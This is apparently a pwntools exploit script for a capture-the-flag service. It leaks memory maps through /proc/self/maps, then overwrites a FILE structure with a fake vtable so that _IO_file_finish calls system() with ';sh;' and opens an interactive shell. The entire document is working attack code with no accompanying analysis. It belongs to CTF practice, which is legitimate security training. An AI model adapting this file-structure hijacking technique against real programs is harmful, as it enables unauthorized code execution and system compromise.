from pwn import *

def openfile(fname):
    r.sendlineafter('choice :','1')
    r.sendlineafter('Filnename:',fname)


def readfile():
    r.sendlineafter('choice :','2')

def writefile():
    r.sendlineafter('choice :','3')
    cont = r.recvuntil('$$$$$$$$$$').strip().decode('utf-8')[:-10][5:].strip()
    return cont

def writebuf(cont):
    r.sendlineafter('choice :','4')
    r.sendlineafter('name :',cont)
    r.interactive()



###Useful Address
code_buf_offset = 0x202040
code_suppl_lock_offset = 0x202540   #Just a random suitable location
code_vtable_offset = 0x202148   #Chosen for convenience
sys_system_offset = 0x45390


###Start Exploit
r = remote('csie.ctf.tw',10144)
###Leak /proc/self/maps
## Strange, my mapping is in reverse order?
## Just try until finding important segments
openfile('/proc/self/maps')
mapping = ''
for i in range(6):
    readfile()
    partial = writefile()
    mapping+=partial
print(mapping)
mapping = mapping.split('\n')
code_base = int(mapping[11][:mapping[11].find('-')],16)
print(hex(code_base))
libc_base = int(mapping[0][:mapping[0].find('-')],16)
print(hex(libc_base))


###Exploit
## 0x88 is _lock offset
## 0xd8 is *vtable offset
## _IO_file_finish is the first function in vtable (with 16 bytes padding at start of structure)
payload = (b'A'*8+b';sh;').ljust(0x88,b'\x00')+p64(code_suppl_lock_offset+code_base)
payload = payload.ljust(0xd8,b'\x00')+p64(code_vtable_offset+code_base)
payload = payload.ljust(0x100,b'\x00')+p64(code_buf_offset+code_base)
payload = payload+b'\x00'*0x10+p64(sys_system_offset+libc_base)

writebuf(payload)
